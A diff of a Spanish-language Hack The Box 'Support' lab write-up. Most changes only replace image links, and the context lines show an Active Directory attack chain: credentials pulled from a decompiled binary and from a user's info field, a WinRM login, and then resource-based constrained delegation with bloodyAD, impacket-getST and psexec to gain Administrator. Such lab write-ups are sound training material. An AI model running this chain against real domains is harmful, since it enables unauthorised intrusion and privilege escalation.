@@ -27,8 +27,7 @@ nmap -sS -p- --min-rate 5000 10.129.230.181
 > 
 > 
 > 
-> ![image.png](%F0%9F%8E%AF%20Support%20%E2%80%94%20HTB%20%5BWindows%20%C2%B7%20Easy%20%C2%B7%20AD%5D/image.png)
-> 
+> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Support/assets/image.png)
 
 ```bash
 nmap -sV -sC -p 53,88,135,139,389,445,636,3268,5985 10.129.230.181
@@ -37,7 +36,7 @@ nmap -sV -sC -p 53,88,135,139,389,445,636,3268,5985 10.129.230.181
 > 
 > 
 > 
-> ![image.png](%F0%9F%8E%AF%20Support%20%E2%80%94%20HTB%20%5BWindows%20%C2%B7%20Easy%20%C2%B7%20AD%5D/image%201.png)
+> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Support/assets/image1.png)
 > 
 
 ---
@@ -53,7 +52,7 @@ smbclient -L //10.129.230.181/ -N
 > 
 > 
 > 
-> ![image.png](%F0%9F%8E%AF%20Support%20%E2%80%94%20HTB%20%5BWindows%20%C2%B7%20Easy%20%C2%B7%20AD%5D/image%202.png)
+> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Support/assets/image2.png)
 > 
 
 ```bash
@@ -64,7 +63,7 @@ smb: \> ls
 > 
 > 
 > 
-> ![image.png](%F0%9F%8E%AF%20Support%20%E2%80%94%20HTB%20%5BWindows%20%C2%B7%20Easy%20%C2%B7%20AD%5D/image%203.png)
+> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Support/assets/image3.png)
 > 
 
 El resto son herramientas conocidas con nombres estándar. `UserInfo.exe.zip` es la única con nombre propio del entorno — merece análisis.
@@ -84,7 +83,7 @@ monodis UserInfo.exe > codigo.txt
 > 
 > 
 > 
-> ![image.png](%F0%9F%8E%AF%20Support%20%E2%80%94%20HTB%20%5BWindows%20%C2%B7%20Easy%20%C2%B7%20AD%5D/image%204.png)
+> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Support/assets/image4.png)
 > 
 
 Luego filtramos los strings en texto claro del ensamblado — los `ldstr` son literales que el código carga en tiempo de ejecución.
@@ -96,7 +95,7 @@ grep "ldstr" codigo.txt
 > 
 > 
 > 
-> ![image.png](%F0%9F%8E%AF%20Support%20%E2%80%94%20HTB%20%5BWindows%20%C2%B7%20Easy%20%C2%B7%20AD%5D/image%205.png)
+> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Support/assets/image5.png)
 > 
 
 Tenemos una cadena en base64 y una clave `armando`. Ahora miramos cómo los usa el código:
@@ -104,7 +103,7 @@ Tenemos una cadena en base64 y una clave `armando`. Ahora miramos cómo los usa 
 > 
 > 
 > 
-> ![image.png](%F0%9F%8E%AF%20Support%20%E2%80%94%20HTB%20%5BWindows%20%C2%B7%20Easy%20%C2%B7%20AD%5D/image%206.png)
+> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Support/assets/image6.png)
 > 
 
 El algoritmo es:
@@ -118,7 +117,7 @@ Replicamos en CyberChef:
 > 
 > 
 > 
-> ![image.png](%F0%9F%8E%AF%20Support%20%E2%80%94%20HTB%20%5BWindows%20%C2%B7%20Easy%20%C2%B7%20AD%5D/image%207.png)
+> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Support/assets/image7.png)
 > 
 
 Contraseña obtenida. Combinada con el usuario `support\ldap` que aparecía en los strings.
@@ -132,7 +131,7 @@ netexec ldap support.htb -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
 > 
 > 
 > 
-> ![image.png](%F0%9F%8E%AF%20Support%20%E2%80%94%20HTB%20%5BWindows%20%C2%B7%20Easy%20%C2%B7%20AD%5D/image%208.png)
+> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Support/assets/image8.png)
 > 
 
 ---
@@ -152,7 +151,7 @@ Revisando el output, en el objeto del usuario `support` hay algo que no debería
 > 
 > 
 > 
-> ![image.png](%F0%9F%8E%AF%20Support%20%E2%80%94%20HTB%20%5BWindows%20%C2%B7%20Easy%20%C2%B7%20AD%5D/image%209.png)
+> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Support/assets/image9.png)
 > 
 
 Contraseña en texto plano en el campo `info` de un usuario de AD. Alguien la puso ahí para "recordarla" y se olvidó de borrarla.
@@ -168,7 +167,7 @@ evil-winrm -i 10.129.230.181 -u support -p 'Ironside47pleasure40Watchful'
 > 
 > 
 > 
-> ![image.png](%F0%9F%8E%AF%20Support%20%E2%80%94%20HTB%20%5BWindows%20%C2%B7%20Easy%20%C2%B7%20AD%5D/image%2010.png)
+> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Support/assets/image10.png)
 > 
 
 ---
@@ -187,7 +186,7 @@ Con acceso al sistema subimos SharpHound para mapear el AD y encontrar rutas de 
 > 
 > 
 > 
-> ![image.png](%F0%9F%8E%AF%20Support%20%E2%80%94%20HTB%20%5BWindows%20%C2%B7%20Easy%20%C2%B7%20AD%5D/image%2011.png)
+> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Support/assets/image11.png)
 > 
 
 Descargamos el zip generado y lo cargamos en BloodHound:
@@ -195,7 +194,7 @@ Descargamos el zip generado y lo cargamos en BloodHound:
 > 
 > 
 > 
-> ![image.png](%F0%9F%8E%AF%20Support%20%E2%80%94%20HTB%20%5BWindows%20%C2%B7%20Easy%20%C2%B7%20AD%5D/image%2012.png)
+> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Support/assets/image12.png)
 > 
 
 El usuario `support` pertenece a un grupo que tiene **GenericAll** sobre el objeto del Domain Controller. Esto significa control total sobre ese objeto de computadora — y el vector de ataque es RBCD.
@@ -222,7 +221,7 @@ bloodyAD --host 10.129.230.181 -d support.htb \
 > 
 > 
 > 
-> ![image.png](%F0%9F%8E%AF%20Support%20%E2%80%94%20HTB%20%5BWindows%20%C2%B7%20Easy%20%C2%B7%20AD%5D/image%2013.png)
+> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Support/assets/image13.png)
 > 
 
 ## Paso 2 — Configurar RBCD
@@ -236,7 +235,7 @@ bloodyAD --host 10.129.230.181 -d support.htb \
 > 
 > 
 > 
-> ![image.png](%F0%9F%8E%AF%20Support%20%E2%80%94%20HTB%20%5BWindows%20%C2%B7%20Easy%20%C2%B7%20AD%5D/image%2014.png)
+> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Support/assets/image14.png)
 > 
 
 ## Paso 3 — Obtener ticket de Administrator con S4U
@@ -251,7 +250,7 @@ impacket-getST -dc-ip 10.129.230.181 \
 > 
 > 
 > 
-> ![image.png](%F0%9F%8E%AF%20Support%20%E2%80%94%20HTB%20%5BWindows%20%C2%B7%20Easy%20%C2%B7%20AD%5D/image%2015.png)
+> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Support/assets/image15.png)
 > 
 
 ## Paso 4 — Exportar ticket y usar psexec
@@ -263,7 +262,7 @@ export KRB5CCNAME=Administrator@cifs_DC.support.htb@SUPPORT.HTB.ccache
 > 
 > 
 > 
-> ![image.png](%F0%9F%8E%AF%20Support%20%E2%80%94%20HTB%20%5BWindows%20%C2%B7%20Easy%20%C2%B7%20AD%5D/image%2016.png)
+> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Support/assets/image16.png)
 > 
 
 ```bash
@@ -273,13 +272,13 @@ impacket-psexec -k -no-pass 'support.htb/Administrator@DC.support.htb'
 > 
 > 
 > 
-> ![image.png](%F0%9F%8E%AF%20Support%20%E2%80%94%20HTB%20%5BWindows%20%C2%B7%20Easy%20%C2%B7%20AD%5D/image%2017.png)
+> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Support/assets/image17.png)
 > 
 
 > 
 > 
 > 
-> ![image.png](%F0%9F%8E%AF%20Support%20%E2%80%94%20HTB%20%5BWindows%20%C2%B7%20Easy%20%C2%B7%20AD%5D/image%2018.png)
+> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Support/assets/image18.png)
 > 
 
 ---
